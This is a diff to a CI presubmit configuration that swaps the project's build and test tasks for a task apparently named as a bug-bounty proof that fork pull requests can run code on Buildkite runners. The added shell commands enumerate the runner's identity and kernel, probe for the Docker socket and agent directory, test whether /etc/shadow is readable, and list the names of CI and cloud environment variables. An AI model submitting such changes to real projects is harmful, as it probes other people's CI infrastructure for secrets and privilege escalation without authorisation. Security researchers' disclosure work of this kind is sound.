@@ -1,12 +1,13 @@
 ---
-buildifier:
-  version: latest
 tasks:
-  presubmit:
+  vrp_buildkite_fork_pr_proof:
     platform: ubuntu2204
-    build_targets:
-    - "--"
-    - "..."
-    test_targets:
-    - "--"
-    - "..."
+    shell_commands:
+      - 'echo VRP_BK_FORK_PR_PROOF_20260519'
+      - 'id'
+      - 'uname -a'
+      - 'pwd'
+      - 'test -S /var/run/docker.sock && echo DOCKER_SOCK_PRESENT || echo DOCKER_SOCK_ABSENT'
+      - 'test -d /var/lib/buildkite-agent && echo BUILDKITE_AGENT_DIR_PRESENT || echo BUILDKITE_AGENT_DIR_ABSENT'
+      - 'test -r /etc/shadow && echo ETC_SHADOW_READABLE || echo ETC_SHADOW_NOT_READABLE'
+      - 'printenv | cut -d= -f1 | grep -E "^(BUILDKITE|GOOGLE|GITHUB|KOKORO|CI)" | sort | sed -n "1,40p"'
